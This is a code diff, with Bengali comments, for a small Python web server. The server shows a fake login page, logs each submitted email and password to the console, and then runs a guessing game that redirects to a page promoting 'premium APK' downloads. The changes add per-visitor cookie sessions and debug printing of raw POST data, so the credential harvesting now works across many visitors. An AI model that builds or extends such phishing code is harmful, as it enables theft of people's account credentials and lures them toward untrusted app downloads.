@@ -3,10 +3,14 @@ import random
 import string
 import urllib.parse
 from urllib.parse import parse_qs, urlparse
-import os  # এনভায়রনমেন্ট ভ্যারিয়েবলের জন্য
+import os
+import uuid  # সেশন আইডি তৈরির জন্য
 
 # গুগল সাইটের লিংক
 SUCCESS_REDIRECT_URL = "https://sites.google.com/view/top6premium-apk-download/home"
+
+# সেশন ডেটা সংরক্ষণের জন্য একটি ডিকশনারি
+sessions = {}
 
 # এলোমেলো URL পাথ তৈরি
 def generate_random_string(length=10):
@@ -193,16 +197,32 @@ fun_page_html = """
 
 # HTTP সার্ভার হ্যান্ডলার
 class FunHandler(BaseHTTPRequestHandler):
-    user_name = None
-    secret_number = None
+    def get_session_id(self):
+        # কুকি থেকে সেশন আইডি পাওয়া
+        cookie_header = self.headers.get("Cookie")
+        if cookie_header:
+            cookies = cookie_header.split(";")
+            for cookie in cookies:
+                if "session_id" in cookie:
+                    return cookie.split("=")[1].strip()
+        # নতুন সেশন আইডি তৈরি করা
+        session_id = str(uuid.uuid4())
+        self.send_header("Set-Cookie", f"session_id={session_id}; Path=/")
+        return session_id
 
-    def generate_options(self):
+    def get_session_data(self):
+        session_id = self.get_session_id()
+        if session_id not in sessions:
+            sessions[session_id] = {"user_name": None, "secret_number": None}
+        return sessions[session_id]
+
+    def generate_options(self, session_data):
         # সঠিক সংখ্যা জেনারেট করা
-        if FunHandler.secret_number is None:
-            FunHandler.secret_number = random.randint(1, 100)
+        if session_data["secret_number"] is None:
+            session_data["secret_number"] = random.randint(1, 100)
 
         # ৩টি অপশন জেনারেট করা
-        correct_number = FunHandler.secret_number
+        correct_number = session_data["secret_number"]
         # সঠিক সংখ্যার কাছাকাছি দুটি ভুল সংখ্যা
         option1 = correct_number
         option2 = random.randint(max(1, correct_number - 20), max(1, correct_number - 1))
@@ -227,22 +247,25 @@ class FunHandler(BaseHTTPRequestHandler):
         parsed_path = urlparse(self.path)
         path = parsed_path.path
 
+        # সেশন ডেটা পাওয়া
+        session_data = self.get_session_data()
+
         # লগইন পেজ
         if path == "/":
-            if FunHandler.user_name is None:
+            if session_data["user_name"] is None:
                 self.send_response(200)
                 self.send_header("Content-type", "text/html")
                 self.end_headers()
                 self.wfile.write(fake_login_page_html.encode("utf-8"))
             else:
                 # ব্যবহারকারী লগইন করেছে, গেম পেজ দেখান
-                options = self.generate_options()
+                options = self.generate_options(session_data)
                 self.send_response(200)
                 self.send_header("Content-type", "text/html")
                 self.end_headers()
                 self.wfile.write(fun_page_html.format(
                     result="",
-                    user_name=FunHandler.user_name,
+                    user_name=session_data["user_name"],
                     option1=options[0],
                     option2=options[1],
                     option3=options[2]
@@ -251,11 +274,17 @@ class FunHandler(BaseHTTPRequestHandler):
     def do_POST(self):
         parsed_path = urlparse(self.path)
         path = parsed_path.path
+        print(f"[DEBUG] Received POST request at path: {path}")  # ডিবাগিং লগ
+
+        # সেশন ডেটা পাওয়া
+        session_data = self.get_session_data()
 
         # লগইন ফর্ম হ্যান্ডলিং
         if path == "/login":
+            print("[DEBUG] Processing /login request")  # ডিবাগিং লগ
             content_length = int(self.headers['Content-Length'])
             post_data = self.rfile.read(content_length).decode("utf-8")
+            print(f"[DEBUG] Raw POST data: {post_data}")  # ডিবাগিং লগ
             parsed_data = parse_qs(post_data)
 
             # ইমেল এবং পাসওয়ার্ড পাওয়া (শুধুমাত্র টেস্টিং উদ্দেশ্যে)
@@ -264,7 +293,7 @@ class FunHandler(BaseHTTPRequestHandler):
             print(f"\n[TEST] Email: {email}, Password: {password}")
 
             # নকল লগইন সফল, ব্যবহারকারীর নাম সেট করা
-            FunHandler.user_name = email.split("@")[0]  # ইমেল থেকে নাম নেওয়া (উদাহরণস্বরূপ)
+            session_data["user_name"] = email.split("@")[0]  # ইমেল থেকে নাম নেওয়া (উদাহরণস্বরূপ)
 
             # গেম পেজে রিডাইরেক্ট
             self.send_response(302)
@@ -273,7 +302,8 @@ class FunHandler(BaseHTTPRequestHandler):
 
         # গেস ফর্ম হ্যান্ডলিং
         elif path == "/guess":
-            if FunHandler.user_name is None:
+            print("[DEBUG] Processing /guess request")  # ডিবাগিং লগ
+            if session_data["user_name"] is None:
                 self.send_response(302)
                 self.send_header("Location", "/")
                 self.end_headers()
@@ -288,22 +318,22 @@ class FunHandler(BaseHTTPRequestHandler):
             user_guess = int(parsed_data.get("guess", ["0"])[0])
 
             # সঠিক সংখ্যার সাথে তুলনা
-            if user_guess == FunHandler.secret_number:
+            if user_guess == session_data["secret_number"]:
                 # সঠিক গেস, গুগল সাইটে রিডাইরেক্ট
                 self.send_response(302)
                 self.send_header("Location", SUCCESS_REDIRECT_URL)
                 self.end_headers()
-                FunHandler.secret_number = None  # রিসেট করা
+                session_data["secret_number"] = None  # রিসেট করা
             else:
                 # ভুল গেস, নতুন সংখ্যা জেনারেট করা
-                FunHandler.secret_number = None  # নতুন সংখ্যার জন্য রিসেট
-                options = self.generate_options()
+                session_data["secret_number"] = None  # নতুন সংখ্যার জন্য রিসেট
+                options = self.generate_options(session_data)
                 self.send_response(200)
                 self.send_header("Content-type", "text/html")
                 self.end_headers()
                 self.wfile.write(fun_page_html.format(
                     result="Wrong! Try again with a new number.",
-                    user_name=FunHandler.user_name,
+                    user_name=session_data["user_name"],
                     option1=options[0],
                     option2=options[1],
                     option3=options[2]
